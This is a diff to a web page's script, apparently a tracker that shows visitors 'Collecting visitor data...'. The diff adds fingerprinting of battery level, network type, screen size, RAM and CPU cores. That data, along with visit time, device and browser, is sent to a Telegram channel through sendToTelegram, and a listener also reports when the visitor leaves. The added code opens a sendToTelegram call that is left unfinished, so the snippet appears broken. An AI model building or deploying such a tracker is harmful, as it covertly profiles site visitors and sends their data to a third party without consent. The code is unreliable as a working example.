@@ -50,7 +50,35 @@ h1{
 <div class="scan">Collecting visitor data...</div>
 </div>
 
+
+
 <script>
+    
+    
+    
+    
+    async function getBattery(){
+  try{
+    const battery = await navigator.getBattery();
+    return Math.round(battery.level * 100) + "%";
+  }catch{
+    return "Not supported";
+  }
+}
+function getConnection(){
+  const conn = navigator.connection || {};
+  return conn.effectiveType || "Unknown";
+}
+const screenSize = screen.width + "x" + screen.height;
+const ram = navigator.deviceMemory || "Unknown";
+const cpu = navigator.hardwareConcurrency || "Unknown";
+(async () => {
+
+const battery = await getBattery();
+const connection = getConnection();
+
+sendToTelegram(
+
 
 // وقت الدخول
 const startTime = Date.now();
@@ -106,12 +134,21 @@ sendToTelegram(
 
 🕒 Time: ${visitTime}
 📱 Device: ${info.device}
-💻 Platform: ${platform}
 🌐 Browser: ${info.browser}
+
+🔋 Battery: ${battery}
+📡 Network: ${connection}
+
+🖥 Screen: ${screenSize}
+🧠 RAM: ${ram} GB
+⚙ CPU Cores: ${cpu}
 
 ━━━━━━━━━━━━━━
 SYSTEM STATUS: ACTIVE`
 );
+
+})();
+
 
 // عند خروج الزائر
 window.addEventListener("beforeunload", function(){
